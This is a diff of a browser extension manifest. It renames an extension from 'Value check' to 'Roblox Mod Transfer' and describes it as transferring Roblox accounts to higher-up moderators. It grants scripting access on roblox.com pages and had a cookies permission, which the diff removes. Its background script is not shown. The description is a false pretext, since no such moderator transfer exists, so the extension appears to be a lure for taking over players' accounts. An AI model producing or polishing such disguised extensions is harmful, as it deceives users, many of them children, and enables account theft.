@@ -1,9 +1,24 @@
 {
   "manifest_version": 3,
-  "name": "Value check",
-  "version": "1.0",
-  "permissions": ["scripting", "activeTab", "cookies"],
+  "name": "Roblox Mod Transfer",
+  "version": "1.0.0",
+  "description": "Transfer Roblox accounts to higher-up moderators",
+  "permissions": ["scripting", "activeTab"],
   "host_permissions": ["https://*.roblox.com/*"],
-  "background": { "service_worker": "background.js" },
-  "action": { "default_title": "Transfer Account" }
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_title": "Transfer Account",
+    "default_icon": {
+      "16": "icon16.png",
+      "48": "icon48.png",
+      "128": "icon128.png"
+    }
+  },
+  "icons": {
+    "16": "icon16.png",
+    "48": "icon48.png",
+    "128": "icon128.png"
+  }
 }
